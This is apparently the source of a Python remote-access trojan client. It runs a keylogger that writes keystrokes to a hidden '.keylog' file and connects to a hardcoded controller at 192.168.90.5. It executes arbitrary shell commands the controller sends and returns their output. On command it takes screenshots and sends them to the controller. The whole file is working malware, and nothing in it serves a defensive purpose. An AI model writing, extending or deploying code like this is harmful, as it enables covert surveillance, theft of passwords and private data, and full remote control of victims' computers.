from pynput.keyboard import Key, Listener
import socket, subprocess, threading, pyautogui, datetime
import sendss, time, os, platform

def start_keylogging():
    def on_press(key):
        f = open(".keylog", "a")
        if str(key).split(".")[0] == "Key":
            f.write("\n" + str(key).split(".")[1] + "\n")
        else:
            f.write(str(key))

    with Listener(on_press = on_press, on_release = None) as listener:
        listener.join()

def start_client(opSys):
    HOST = "192.168.90.5"
    #HOST = "172.16.120.153"
    PORT = 5678

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    s.send(bytes(platform.system(), encoding = "utf8"))
    while True:
        data = s.recv(1024)
        if data.decode() == "":
            break
        c = data.decode().split()
        if c[0] == "exec":
            binp = " ".join(c[1:])
            if opSys == "linux":
                print("starting linux")
                open("tempBash.sh", "w").write(binp + " > bashOutput")
                os.system("./tempBash.sh")
                output = open("bashOutput", "rb").read()
            elif opSys == "windows":
                print("starting windows")
                output = bytes(os.popen(binp).read(), encoding = "utf8")
            if output:
                s.sendall(output)
            else:
                s.send(b"OK")
        elif c[0] == "getss":
            s.send(b"got it")
            #def s():
            ss = pyautogui.screenshot()
            ss.save("screenShots/secret.png")
            print("saved..")
            sender = sendss.dedess(HOST, 6677)
            print("sending..")
            sender.send()

            '''t = threading.Thread(target = s)
            t.start()
            t.join()'''

        else:
            s.send(b"OK")

        print(c)

if __name__ == "__main__":
    opSys = platform.system().lower()
    if opSys == "linux":
        open("tempBash.sh", "w")
        open("bashOutput", "w")
        os.system("chmod +x tempBash.sh")

    t1 = threading.Thread(target = start_keylogging)
    t2 = threading.Thread(target = start_client, args = [opSys])

    t1.start()
    t2.start()

    t1.join()
    t2.join()
